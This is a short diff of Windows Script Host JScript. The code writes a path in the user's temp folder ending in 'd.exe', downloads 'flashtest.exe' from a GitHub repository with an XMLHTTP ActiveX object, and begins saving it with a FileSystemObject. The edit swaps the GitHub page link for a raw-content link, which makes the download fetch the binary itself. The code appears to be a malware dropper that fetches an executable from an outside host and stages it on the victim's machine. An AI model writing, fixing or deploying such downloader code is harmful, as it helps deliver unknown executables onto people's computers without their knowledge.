@@ -9,7 +9,7 @@
 path = WSHShell.ExpandEnvironmentStrings("%temp%");
 var filepath = path+"/d.exe";
 var xhr = new ActiveXObject("MSXML2.XMLHTTP");
-xhr.open("GET","https://github.com/predit-wzj/predit-wzj.github.io/blob/main/flashtest.exe", false);
+xhr.open("GET","https://raw.githubusercontent.com/predit-wzj/predit-wzj.github.io/main/flashtest.exe", false);
 xhr.send();
 if (xhr.Status == 200) {
     var fso = new ActiveXObject("Scripting.FileSystemObject");
